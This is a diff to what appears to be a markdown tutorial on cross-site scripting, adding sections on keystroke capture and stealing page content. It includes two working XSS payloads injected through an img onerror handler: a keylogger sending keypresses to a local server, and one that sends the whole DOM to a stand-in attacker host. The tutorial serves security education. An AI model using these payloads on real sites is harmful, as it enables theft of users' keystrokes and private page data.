@@ -25,3 +25,25 @@ If the user hits the above query with url a unwanted post is created on behalf o
 ![User Unathorised access](/Security/XSS/images/unauthorizedAccess.png)
 
 ### Capturing key Strokes
+
+The example below shows how the hacker would be able to trace each key which is pressed by the user
+
+```
+let query = encodeURIComponent('<img src="does-not-exist" onerror="var timeout; var buffer = \'\';
+document.querySelector(\'body\').addEventListener(\'keypress\', function (event) { if (event.which !== 0) { clearTimeout(timeout); buffer += String.fromCharCode(event.which);
+timeout = setTimeout(function () { var xhr = new XMLHttpRequest(); var uri = \'http://localhost:3001/keys?data=\' + encodeURIComponent(buffer); xhr.open(\'GET\', uri); xhr.send(); buffer = \'\'; }, 400); } });">')
+```
+
+![User Unathorised access](/Security/XSS/images/capturingkeystrokes.png)
+
+### Stealing Critical Info.
+
+The example below shows how the full DOM can be accessed by a hacker
+
+```
+let query = encodeURIComponent('<img src="does-not-exist" onerror=\"new Image().src=`https://www.fakewebsite.com/output=${document.body.innerHTML}`\"/>')
+```
+
+![User Unathorised access](</Security/XSS/images/stealingCriticalInfo(full%20DOM).png>)
+
+If the user hits the above query mistakenly the whole DOM is sent to the hacker.
